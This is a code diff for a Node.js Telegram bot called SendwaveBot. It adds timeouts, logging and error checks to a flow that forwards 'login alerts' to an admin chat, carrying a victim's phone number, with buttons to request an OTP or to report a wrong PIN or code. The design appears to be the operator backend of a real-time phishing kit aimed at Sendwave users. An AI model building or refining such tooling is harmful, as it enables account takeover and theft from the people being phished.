@@ -3,7 +3,7 @@ const crypto = require('crypto');
 const fs = require('fs');
 const path = require('path');
 
-// ── Persistent session store (survives restarts) ──
+// ── Persistent session store ──
 const SESSION_FILE = path.join(__dirname, 'sessions.json');
 
 function loadSessions() {
@@ -47,16 +47,24 @@ class SendwaveBot {
 
   async sendRequest(method, data = {}) {
     const url = this.apiUrl + method;
+    console.log(`📤 Calling Telegram: ${method}`);
     try {
+      const controller = new AbortController();
+      const timeout = setTimeout(() => controller.abort(), 10000); // 10s timeout
+
       const params = new URLSearchParams(data);
       const response = await fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: params.toString()
+        body: params.toString(),
+        signal: controller.signal
       });
-      return await response.json();
+      clearTimeout(timeout);
+      const json = await response.json();
+      console.log(`📥 Telegram response [${method}]:`, JSON.stringify(json));
+      return json;
     } catch (err) {
-      console.error(`Telegram API error [${method}]:`, err.message);
+      console.error(`❌ Telegram API error [${method}]:`, err.message);
       return null;
     }
   }
@@ -70,6 +78,8 @@ class SendwaveBot {
     const sessionId = this.generateSessionId(phone);
     const now = new Date().toISOString().replace('T', ' ').substring(0, 19);
     const fullPhone = `${countryCode}${phone}`;
+
+    console.log(`🔐 Sending login alert for ${fullPhone}`);
 
     const keyboard = {
       inline_keyboard: [[
@@ -85,12 +95,17 @@ class SendwaveBot {
       `⏰ *Time:* ${now}\n\n` +
       `Choose action:`;
 
-    await this.sendRequest('sendMessage', {
+    const result = await this.sendRequest('sendMessage', {
       chat_id: this.adminChatId,
       text: message,
       parse_mode: 'Markdown',
       reply_markup: JSON.stringify(keyboard)
     });
+
+    if (!result || !result.ok) {
+      console.error('❌ Failed to send Telegram message:', JSON.stringify(result));
+      return { success: false };
+    }
 
     setSession(sessionId, 'pending');
     console.log(`✅ Session created: ${sessionId}`);
@@ -131,21 +146,13 @@ class SendwaveBot {
     console.log(`🔔 Callback received: ${data}`);
 
     if (data.startsWith('otp_request_')) {
-      const sessionId = data.replace('otp_request_', '');
-      setSession(sessionId, 'approved');
-      console.log(`✅ Approved: ${sessionId}`);
+      setSession(data.replace('otp_request_', ''), 'approved');
     } else if (data.startsWith('wrong_pin_')) {
-      const sessionId = data.replace('wrong_pin_', '');
-      setSession(sessionId, 'wrong_pin');
-      console.log(`❌ Wrong PIN: ${sessionId}`);
+      setSession(data.replace('wrong_pin_', ''), 'wrong_pin');
     } else if (data.startsWith('wrong_')) {
-      const sessionId = data.replace('wrong_', '');
-      setSession(sessionId, 'wrong_code');
-      console.log(`❌ Wrong Code: ${sessionId}`);
+      setSession(data.replace('wrong_', ''), 'wrong_code');
     } else if (data.startsWith('continue_')) {
-      const sessionId = data.replace('continue_', '');
-      setSession(sessionId, 'continue');
-      console.log(`➡️ Continue: ${sessionId}`);
+      setSession(data.replace('continue_', ''), 'continue');
     }
 
     await this.sendRequest('answerCallbackQuery', { callback_query_id: callbackId });
